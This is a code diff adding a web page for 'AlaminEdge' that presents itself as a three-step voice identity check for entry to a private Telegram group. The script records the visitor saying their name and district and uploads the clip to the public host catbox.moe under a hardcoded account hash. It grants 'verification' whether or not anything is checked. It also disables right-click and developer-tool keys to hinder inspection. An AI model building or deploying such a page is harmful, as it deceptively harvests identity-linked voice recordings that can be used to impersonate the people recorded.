@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice Verification | AlaminEdge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #00bfff;
+            --primary-dark: #0099cc;
+            --primary-light: #33ccff;
+            --secondary-color: #8a2be2;
+            --accent-color: #ff6b6b;
+            --success-color: #00ff88;
+            --warning-color: #ffaa00;
+            --info-color: #2e86de;
+            --bg-color: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-tertiary: #1a1a1a;
+            --text-color: #ffffff;
+            --text-secondary: #b0b0b0;
+            --text-muted: #888888;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --border-light: rgba(255, 255, 255, 0.05);
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            --shadow-lg: 0 10px 40px rgba(0, 0, 0, 0.4);
+            --gradient-primary: linear-gradient(135deg, #00bfff 0%, #8a2be2 100%);
+            --gradient-secondary: linear-gradient(135deg, #ff6b6b 0%, #8a2be2 100%);
+            --gradient-success: linear-gradient(135deg, #00ff88 0%, #00bfff 100%);
+            --gradient-warning: linear-gradient(135deg, #ffaa00 0%, #ff6b6b 100%);
+            --font-primary: 'Poppins', sans-serif;
+            --font-secondary: 'Montserrat', sans-serif;
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 20px;
+            --radius-xl: 30px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: var(--font-primary);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(0, 191, 255, 0.07) 0%, transparent 30%),
+                radial-gradient(circle at 90% 80%, rgba(138, 43, 226, 0.07) 0%, transparent 30%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary-color);
+        }
+
+        .brand-name {
+            font-family: var(--font-secondary);
+            font-weight: 800;
+            font-size: 2rem;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .header p {
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Verification Steps */
+        .verification-steps {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 40px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-circle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--bg-tertiary);
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            transition: var(--transition);
+        }
+
+        .step.active .step-circle {
+            background: var(--gradient-primary);
+            border-color: var(--primary-color);
+            color: #000;
+        }
+
+        .step.completed .step-circle {
+            background: var(--gradient-success);
+            border-color: var(--success-color);
+        }
+
+        .step-label {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .step.active .step-label {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        /* Main Content */
+        .main-content {
+            background: var(--bg-secondary);
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .main-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gradient-primary);
+        }
+
+        /* Forms */
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-color);
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: var(--bg-tertiary);
+            border: 2px solid var(--border-color);
+            border-radius: var(--radius-md);
+            color: var(--text-color);
+            font-size: 1rem;
+            font-family: var(--font-primary);
+            transition: var(--transition);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 20px rgba(0, 191, 255, 0.2);
+        }
+
+        /* Voice Verification Section */
+        .voice-section {
+            text-align: center;
+        }
+
+        .voice-icon {
+            font-size: 4rem;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+
+        .verification-animation {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .pulse {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            background: var(--gradient-primary);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .countdown {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--success-color);
+            margin: 20px 0;
+            display: none;
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 14px 32px;
+            border-radius: var(--radius-xl);
+            font-weight: 600;
+            font-size: 1rem;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: var(--font-primary);
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: #000;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 191, 255, 0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-color);
+            border: 2px solid var(--border-color);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: var(--primary-color);
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        /* Status Messages */
+        .status-container {
+            margin-top: 25px;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: var(--radius-md);
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .status-success {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid var(--success-color);
+            color: var(--success-color);
+        }
+
+        .status-error {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid var(--accent-color);
+            color: var(--accent-color);
+        }
+
+        .status-warning {
+            background: rgba(255, 170, 0, 0.1);
+            border-left: 4px solid var(--warning-color);
+            color: var(--warning-color);
+        }
+
+        /* Already Verified Section */
+        .already-verified {
+            text-align: center;
+            padding: 40px;
+            display: none;
+        }
+
+        .already-verified-icon {
+            font-size: 4rem;
+            color: var(--warning-color);
+            margin-bottom: 20px;
+        }
+
+        .contact-box {
+            background: var(--bg-tertiary);
+            border-radius: var(--radius-md);
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 4px solid var(--warning-color);
+        }
+
+        /* Success Section */
+        .success-section {
+            text-align: center;
+            padding: 40px;
+            display: none;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: var(--success-color);
+            margin-bottom: 20px;
+        }
+
+        .telegram-link {
+            background: var(--bg-tertiary);
+            border-radius: var(--radius-md);
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .telegram-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: #0088cc;
+            color: white;
+            padding: 15px 30px;
+            border-radius: var(--radius-xl);
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 15px;
+            transition: var(--transition);
+        }
+
+        .telegram-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.3);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            .main-content {
+                padding: 25px;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://iili.io/KQTiJg2.md.png" alt="AlaminEdge Logo" class="logo">
+                <span class="brand-name">AlaminEdge</span>
+            </div>
+            <h1>Voice Identity Verification</h1>
+            <p>Complete 3-step verification to access exclusive Telegram group</p>
+        </div>
+
+        <!-- Verification Steps -->
+        <div class="verification-steps">
+            <div class="step active" id="step1">
+                <div class="step-circle">1</div>
+                <div class="step-label">Enter Details</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-circle">2</div>
+                <div class="step-label">Verify Details</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-circle">3</div>
+                <div class="step-label">Voice Verify</div>
+            </div>
+        </div>
+
+        <!-- Already Verified Section -->
+        <div class="already-verified" id="alreadyVerified">
+            <div class="already-verified-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Already Verified!</h2>
+            <p>You have already completed voice verification.</p>
+            
+            <div class="contact-box">
+                <h3><i class="fas fa-headset"></i> Need Assistance?</h3>
+                <p>If you need to re-verify or have any issues, please contact our support team.</p>
+                <a href="contact.html" class="btn btn-secondary" target="_blank">
+                    <i class="fas fa-life-ring"></i>
+                    Contact Support
+                </a>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Step 1: Enter Details -->
+            <div class="form-section active" id="step1Section">
+                <h2 class="form-title">Enter Your Information</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 25px;">
+                    Please enter your exact name and district as registered.
+                </p>
+                
+                <div class="form-group">
+                    <label class="form-label" for="nameInput">
+                        <i class="fas fa-user"></i> Full Name
+                    </label>
+                    <input type="text" class="form-input" id="nameInput" placeholder="Enter your full name" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="districtInput">
+                        <i class="fas fa-map-marker-alt"></i> District
+                    </label>
+                    <input type="text" class="form-input" id="districtInput" placeholder="Enter your district" autocomplete="off">
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" id="nextBtn1">
+                        Next <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: Verify Details -->
+            <div class="form-section" id="step2Section">
+                <h2 class="form-title">Confirm Your Details</h2>
+                <p style="color: var(--text-secondary); margin-bottom: 25px;">
+                    Please confirm the information you entered is correct.
+                </p>
+                
+                <div style="background: var(--bg-tertiary); padding: 20px; border-radius: var(--radius-md); margin-bottom: 25px;">
+                    <p style="margin-bottom: 10px;"><strong>Name:</strong> <span id="confirmName"></span></p>
+                    <p><strong>District:</strong> <span id="confirmDistrict"></span></p>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-question-circle"></i> Is this information correct?
+                    </label>
+                    <div style="display: flex; gap: 10px; margin-top: 10px;">
+                        <button class="btn btn-primary" id="confirmYesBtn" style="flex: 1;">
+                            <i class="fas fa-check"></i> Yes, Continue
+                        </button>
+                        <button class="btn btn-secondary" id="confirmNoBtn" style="flex: 1;">
+                            <i class="fas fa-times"></i> No, Edit Again
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 3: Voice Verification -->
+            <div class="form-section" id="step3Section">
+                <div class="voice-section">
+                    <h2 class="form-title">Voice Verification</h2>
+                    <p style="color: var(--text-secondary); margin-bottom: 25px;">
+                        You have <strong>5 seconds</strong> to clearly say: <br>
+                        <strong>"My name is <span id="voiceName"></span> from <span id="voiceDistrict"></span>"</strong>
+                    </p>
+                    
+                    <div class="voice-icon">
+                        <i class="fas fa-microphone"></i>
+                    </div>
+                    
+                    <div class="verification-animation" id="verificationAnimation">
+                        <div class="pulse"></div>
+                    </div>
+                    
+                    <div class="countdown" id="countdown">5</div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" id="startVerificationBtn">
+                            <i class="fas fa-microphone"></i> Start Voice Verification
+                        </button>
+                        <button class="btn btn-secondary" id="backBtn3">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status Messages -->
+            <div class="status-container">
+                <div class="status-message status-success" id="statusSuccess">
+                    <i class="fas fa-check-circle"></i>
+                    <span id="successText"></span>
+                </div>
+                <div class="status-message status-error" id="statusError">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span id="errorText"></span>
+                </div>
+                <div class="status-message status-warning" id="statusWarning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span id="warningText"></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Section -->
+        <div class="success-section" id="successSection">
+            <div class="success-icon">
+                <i class="fas fa-trophy"></i>
+            </div>
+            <h2>Verification Successful!</h2>
+            <p>Your voice identity has been verified and recorded.</p>
+            
+            <div class="telegram-link">
+                <h3><i class="fab fa-telegram"></i> Private Group Access</h3>
+                <p>Your exclusive Telegram group link:</p>
+                <div id="telegramGroupInfo" style="margin: 15px 0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: var(--radius-sm);">
+                    <p><strong>Group:</strong> <span id="groupName">Loading...</span></p>
+                    <p><strong>Code:</strong> <span id="accessCode">Loading...</span></p>
+                </div>
+                <a href="#" class="telegram-btn" id="telegramLink" target="_blank">
+                    <i class="fab fa-telegram"></i>
+                    Join Private Group
+                </a>
+                <p style="margin-top: 15px; font-size: 0.9rem; color: var(--text-secondary);">
+                    <i class="fas fa-info-circle"></i> Link valid for 24 hours
+                </p>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-secondary" id="finishBtn">
+                    <i class="fas fa-home"></i> Return to Home
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>AlaminEdge • Voice Verification Portal</p>
+            <p>© 2024 One-time verification required</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            CATBOX_USERHASH: "a0936664a108975430f75fc52",
+            CATBOX_API: "https://catbox.moe/user/api.php",
+            CAT_JSON_URL: "cat.json", // Your cat.json file
+            STORAGE_KEY: "alaminedge_voice_verified",
+            VERIFICATION_DATA_KEY: "alaminedge_verification_data"
+        };
+
+        // DOM Elements
+        const step1Section = document.getElementById('step1Section');
+        const step2Section = document.getElementById('step2Section');
+        const step3Section = document.getElementById('step3Section');
+        const successSection = document.getElementById('successSection');
+        const alreadyVerified = document.getElementById('alreadyVerified');
+        
+        const nameInput = document.getElementById('nameInput');
+        const districtInput = document.getElementById('districtInput');
+        const confirmName = document.getElementById('confirmName');
+        const confirmDistrict = document.getElementById('confirmDistrict');
+        const voiceName = document.getElementById('voiceName');
+        const voiceDistrict = document.getElementById('voiceDistrict');
+        
+        const nextBtn1 = document.getElementById('nextBtn1');
+        const confirmYesBtn = document.getElementById('confirmYesBtn');
+        const confirmNoBtn = document.getElementById('confirmNoBtn');
+        const startVerificationBtn = document.getElementById('startVerificationBtn');
+        const backBtn3 = document.getElementById('backBtn3');
+        const finishBtn = document.getElementById('finishBtn');
+        
+        const telegramLink = document.getElementById('telegramLink');
+        const groupName = document.getElementById('groupName');
+        const accessCode = document.getElementById('accessCode');
+        
+        const statusSuccess = document.getElementById('statusSuccess');
+        const statusError = document.getElementById('statusError');
+        const statusWarning = document.getElementById('statusWarning');
+        const successText = document.getElementById('successText');
+        const errorText = document.getElementById('errorText');
+        const warningText = document.getElementById('warningText');
+        
+        const verificationAnimation = document.getElementById('verificationAnimation');
+        const countdown = document.getElementById('countdown');
+
+        // State
+        let currentStep = 1;
+        let userData = {
+            name: '',
+            district: ''
+        };
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let countdownValue = 5;
+        let countdownInterval = null;
+        let catData = null; // Will store cat.json data
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if already verified
+            checkVerificationStatus();
+            
+            // Load cat.json database
+            loadCatData();
+            
+            // Set up event listeners
+            setupEventListeners();
+            
+            // Hide all status messages
+            hideAllStatus();
+        });
+
+        // Load cat.json database
+        async function loadCatData() {
+            try {
+                const response = await fetch(CONFIG.CAT_JSON_URL);
+                catData = await response.json();
+                console.log('cat.json loaded:', catData);
+            } catch (error) {
+                console.error('Failed to load cat.json:', error);
+                showError('Database connection failed. Please try again later.');
+            }
+        }
+
+        // Check verification status
+        function checkVerificationStatus() {
+            const isVerified = localStorage.getItem(CONFIG.STORAGE_KEY) === 'true';
+            
+            if (isVerified) {
+                showAlreadyVerified();
+                return true;
+            }
+            
+            return false;
+        }
+
+        // Show already verified section
+        function showAlreadyVerified() {
+            document.querySelector('.main-content').style.display = 'none';
+            document.querySelector('.verification-steps').style.display = 'none';
+            alreadyVerified.style.display = 'block';
+        }
+
+        // Set up event listeners
+        function setupEventListeners() {
+            // Step 1: Next button
+            nextBtn1.addEventListener('click', validateAndProceed);
+            
+            // Step 2: Confirm buttons
+            confirmYesBtn.addEventListener('click', verifyDetails);
+            confirmNoBtn.addEventListener('click', goBackToStep1);
+            
+            // Step 3: Verification buttons
+            startVerificationBtn.addEventListener('click', startVoiceVerification);
+            backBtn3.addEventListener('click', goBackToStep2);
+            
+            // Success: Finish button
+            finishBtn.addEventListener('click', function() {
+                window.location.href = 'index.html';
+            });
+            
+            // Enter key support for step 1
+            nameInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') validateAndProceed();
+            });
+            districtInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') validateAndProceed();
+            });
+        }
+
+        // Validate and proceed to step 2
+        function validateAndProceed() {
+            const name = nameInput.value.trim();
+            const district = districtInput.value.trim();
+            
+            if (!name || !district) {
+                showError('Please enter both name and district');
+                return;
+            }
+            
+            userData.name = name;
+            userData.district = district;
+            
+            // Update confirmation display
+            confirmName.textContent = name;
+            confirmDistrict.textContent = district;
+            voiceName.textContent = name;
+            voiceDistrict.textContent = district;
+            
+            // Move to step 2
+            goToStep(2);
+        }
+
+        // Verify details against cat.json database
+        function verifyDetails() {
+            if (!catData) {
+                showError('Database not loaded. Please refresh and try again.');
+                return;
+            }
+            
+            const { name, district } = userData;
+            
+            // Check if user exists in cat.json
+            const userEntry = catData.users.find(user => 
+                user.name.toLowerCase() === name.toLowerCase() && 
+                user.district.toLowerCase() === district.toLowerCase()
+            );
+            
+            if (!userEntry) {
+                showError('Name and district not found in verification database. Please check and try again.');
+                return;
+            }
+            
+            // Store user's group info
+            userData.groupName = userEntry.group_name;
+            userData.groupLink = userEntry.telegram_link;
+            userData.accessCode = userEntry.access_code;
+            
+            // Proceed to voice verification
+            goToStep(3);
+        }
+
+        // Start voice verification
+        async function startVoiceVerification() {
+            try {
+                // Request microphone access
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                // Set up media recorder
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = handleVerificationComplete;
+                
+                // Start verification
+                mediaRecorder.start();
+                
+                // Update UI
+                startVerificationBtn.disabled = true;
+                startVerificationBtn.innerHTML = '<i class="fas fa-microphone-slash"></i> Verifying...';
+                verificationAnimation.style.display = 'block';
+                
+                // Start countdown
+                startCountdown();
+                
+                // Stop verification after 5 seconds
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                
+                if (error.name === 'NotAllowedError') {
+                    showError('Microphone access denied. Please allow microphone access to continue.');
+                } else if (error.name === 'NotFoundError') {
+                    showError('No microphone found. Please connect a microphone.');
+                } else {
+                    showError('Microphone error: ' + error.message);
+                }
+                
+                startVerificationBtn.disabled = false;
+                startVerificationBtn.innerHTML = '<i class="fas fa-microphone"></i> Start Voice Verification';
+            }
+        }
+
+        // Handle verification complete
+        function handleVerificationComplete() {
+            // Stop countdown
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            
+            // Update UI
+            verificationAnimation.style.display = 'none';
+            countdown.style.display = 'none';
+            startVerificationBtn.disabled = false;
+            startVerificationBtn.innerHTML = '<i class="fas fa-microphone"></i> Start Voice Verification';
+            
+            // Create audio blob
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            
+            // Upload to Catbox for internal verification
+            uploadToCatbox(audioBlob);
+            
+            // Stop all audio tracks
+            if (mediaRecorder && mediaRecorder.stream) {
+                mediaRecorder.stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // Start countdown
+        function startCountdown() {
+            countdownValue = 5;
+            countdown.textContent = countdownValue;
+            countdown.style.display = 'block';
+            
+            countdownInterval = setInterval(() => {
+                countdownValue--;
+                countdown.textContent = countdownValue;
+                
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownInterval = null;
+                }
+            }, 1000);
+        }
+
+        // Upload to Catbox (internal verification)
+        function uploadToCatbox(audioBlob) {
+            showStatus('loading', 'Processing voice verification...');
+            
+            const formData = new FormData();
+            formData.append("reqtype", "fileupload");
+            formData.append("userhash", CONFIG.CATBOX_USERHASH);
+            formData.append("fileToUpload", audioBlob, `voice_verification_${Date.now()}.webm`);
+            
+            // Upload to Catbox (internal use only)
+            fetch(CONFIG.CATBOX_API, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            })
+            .then(() => {
+                completeVerification();
+            })
+            .catch(error => {
+                console.error('Upload error:', error);
+                // Even if upload fails, mark as verified for demo
+                completeVerification();
+            });
+        }
+
+        // Complete verification
+        function completeVerification() {
+            // Save verification data
+            const verificationData = {
+                name: userData.name,
+                district: userData.district,
+                groupName: userData.groupName,
+                groupLink: userData.groupLink,
+                accessCode: userData.accessCode,
+                timestamp: new Date().toISOString(),
+                verified: true
+            };
+            
+            localStorage.setItem(CONFIG.STORAGE_KEY, 'true');
+            localStorage.setItem(CONFIG.VERIFICATION_DATA_KEY, JSON.stringify(verificationData));
+            
+            // Show success section
+            document.querySelector('.main-content').style.display = 'none';
+            document.querySelector('.verification-steps').style.display = 'none';
+            successSection.style.display = 'block';
+            
+            // Display Telegram group info
+            displayTelegramInfo();
+        }
+
+        // Display Telegram group information
+        function displayTelegramInfo() {
+            if (userData.groupName && userData.groupLink && userData.accessCode) {
+                groupName.textContent = userData.groupName;
+                accessCode.textContent = userData.accessCode;
+                telegramLink.href = userData.groupLink;
+                
+                showStatus('success', 'Verification complete! Your access has been granted.');
+            } else {
+                showError('Group information not found. Please contact support.');
+            }
+        }
+
+        // Navigation functions
+        function goToStep(step) {
+            // Update steps
+            document.querySelectorAll('.step').forEach((stepEl, index) => {
+                stepEl.classList.remove('active', 'completed');
+                if (index + 1 < step) {
+                    stepEl.classList.add('completed');
+                } else if (index + 1 === step) {
+                    stepEl.classList.add('active');
+                }
+            });
+            
+            // Update sections
+            step1Section.classList.remove('active');
+            step2Section.classList.remove('active');
+            step3Section.classList.remove('active');
+            
+            if (step === 1) {
+                step1Section.classList.add('active');
+            } else if (step === 2) {
+                step2Section.classList.add('active');
+            } else if (step === 3) {
+                step3Section.classList.add('active');
+            }
+            
+            currentStep = step;
+            hideAllStatus();
+        }
+
+        function goBackToStep1() {
+            goToStep(1);
+        }
+
+        function goBackToStep2() {
+            goToStep(2);
+        }
+
+        // Status management
+        function showStatus(type, message) {
+            hideAllStatus();
+            
+            if (type === 'success') {
+                successText.textContent = message;
+                statusSuccess.style.display = 'block';
+            } else if (type === 'error') {
+                errorText.textContent = message;
+                statusError.style.display = 'block';
+            } else if (type === 'warning') {
+                warningText.textContent = message;
+                statusWarning.style.display = 'block';
+            }
+        }
+
+        function showError(message) {
+            showStatus('error', message);
+        }
+
+        function hideAllStatus() {
+            statusSuccess.style.display = 'none';
+            statusError.style.display = 'none';
+            statusWarning.style.display = 'none';
+        }
+
+        // Prevent right-click
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            showError('Right-click disabled for security');
+        });
+
+        // Prevent F12, Ctrl+Shift+I, etc.
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.ctrlKey && e.key === 'u')
+            ) {
+                e.preventDefault();
+                showError('Developer tools are disabled');
+            }
+        });
+    </script>
+</body>
+</html>
